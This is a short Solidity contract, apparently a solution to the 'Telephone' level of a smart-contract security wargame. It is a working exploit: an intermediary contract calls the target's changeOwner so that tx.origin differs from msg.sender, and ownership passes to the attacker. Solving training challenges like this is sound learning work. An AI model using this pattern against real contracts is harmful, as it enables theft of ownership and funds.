pragma solidity ^0.4.18;

import "levels/Telephone.sol";

contract TelephoneHack {
    address owner;
    Telephone target;

    function TelephoneHack(address _target) public {
        target = Telephone(_target);
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        target.changeOwner(_owner);
    }
}